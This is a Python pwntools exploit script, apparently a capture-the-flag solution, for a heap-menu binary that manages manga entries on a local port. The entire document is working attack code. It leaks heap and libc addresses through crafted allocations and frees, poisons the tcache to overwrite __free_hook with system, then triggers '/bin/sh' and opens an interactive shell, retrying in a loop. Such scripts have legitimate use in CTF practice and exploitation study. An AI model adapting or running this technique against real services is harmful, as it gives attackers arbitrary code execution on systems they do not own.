from pwn import *

def add_manga(idx,v,r):
	p.sendafter("> ","1")
	p.sendafter("id: ",str(idx))
	p.sendafter("Volume: ",str(v))
	p.sendafter("? ",r)

def remove_manga(idx):
	p.sendafter("> ","2")
	p.sendafter("> ","y")
	p.sendafter(": ",str(idx))

def add_feedback(s,c="\x00"):
	p.sendafter("> ","3")
	p.sendafter("size: ",str(s))
	p.sendafter("Feedback: ",c)

p = None
libc = ELF("./libc.so.6")
def attack():
	global p
	# p = process("./pwn",env={"LD_PRELOAD":"./libc.so.6"})
	p = remote("127.0.0.1","2000")

	t = 0.1

	for i in range(7):
		add_manga(0,0,"PPP")

	add_manga(1,15,"PPP")
	for i in range(8):
		remove_manga(i)

	add_feedback(100000,"P")

	for i in range(7):
		add_manga(0,0,"PPP")

	add_feedback(100000,"P")

	add_feedback(0x28,p64(0)*3+b"\x90")
	add_feedback(0x2000,"\x00"*24)

	p.sendafter("> ","2")

	try:
		p.recvuntil("(null)")
		p.recvuntil("$")
		heapbase = int(p.recvuntil(" -")[:-2].decode(),10) - 0x5d0
		print(hex(heapbase))
	except:
		p.close()
		return

	p.sendafter("> ","n")
	for i in range(4):
		add_manga(0,0,"\x00")
	for i in range(2):
		add_manga(0,0,"\x00")

	for i in range(8,15):
		remove_manga(i)
	for i in range(16,19):
		remove_manga(i)	

	add_feedback(0x2000,"\x00")
	add_feedback(0x28,p64(0)*3+p64(heapbase+0x650))

	p.sendafter("> ","2")
	p.recvuntil("Volume 81   $")
	libc.address = int(p.recvuntil(" - ")[:-3].decode(),10) - libc.sym["main_arena"] - 0x140
	print(hex(libc.address))
	p.sendafter("> ","n")

	add_feedback(0xf0-8,"\x00")

	for i in range(7):
		add_manga(0,0,"\x00")
		
	add_manga(1,15,"PPP")
	c = p64(0)*5
	c+= p64(0x211)
	c+= p64(0)*3
	c+= p64(heapbase+0x2a0)
	c+= p64(0)*4
	add_feedback(0xa8,c)
	add_manga(0,0,"\x00")
	remove_manga(29)
	remove_manga(28)

	c = p64(0)*3
	c+= p64(heapbase+0x2a0)
	c+= p64(1)*2
	c+= p64(heapbase+0x860)
	c+= p64(0)
	add_feedback(0x48,c)

	remove_manga(0)

	add_manga(0,0,"\x00")
	add_manga(0,0,"\x00")
	c = p64(0) * 15
	c+= p64(0x51)
	c+= p64(0) * 3
	c+= p64(heapbase+0x2a0)
	c+= p64(0)*4
	add_feedback(0x208,c)

	remove_manga(0)

	add_manga(0,0,"\x00")
	add_manga(0,0,"\x00")
	remove_manga(33)
	remove_manga(32)

	c = p64(0) * 15
	c+= p64(0x51)
	c+= p64(libc.sym["__free_hook"]-8)[:-1]
	add_feedback(0x208,c)

	add_manga(0,0,"\x00")

	add_feedback(0x48,b"/bin/sh\x00"+p64(libc.sym["system"]))
	p.interactive()
	exit(0)

while(1):
	attack()
